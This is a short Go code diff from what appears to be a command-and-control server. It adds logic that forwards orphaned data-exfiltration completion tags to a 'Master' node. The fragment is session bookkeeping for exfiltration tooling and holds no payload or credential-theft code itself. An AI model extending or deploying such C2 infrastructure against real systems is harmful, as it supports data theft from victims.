@@ -800,6 +800,17 @@ func (c2 *C2Manager) handleExfilDataFrame(frame *ExfilFrame, clientIP string) (b
 func (c2 *C2Manager) handleExfilCompletionFrame(tag string) (bool, error) {
 	tracker, ok := c2.getExfilTagTracker(tag)
 	if !ok || tracker.SessionID == 0 {
+		// If we don't know the session, try to forward the completion tag to Master
+		if masterClient != nil {
+			if err := masterClient.MarkExfilCompleteByTag(tag); err == nil {
+				if c2.debug {
+					logf("[Exfil] Forwarded orphan completion tag=%s to Master", tag)
+				}
+				return true, nil
+			} else if c2.debug {
+				logf("[Exfil] Failed to forward orphan completion tag=%s: %v", tag, err)
+			}
+		}
 		return false, fmt.Errorf("unknown exfil session for completion")
 	}
 
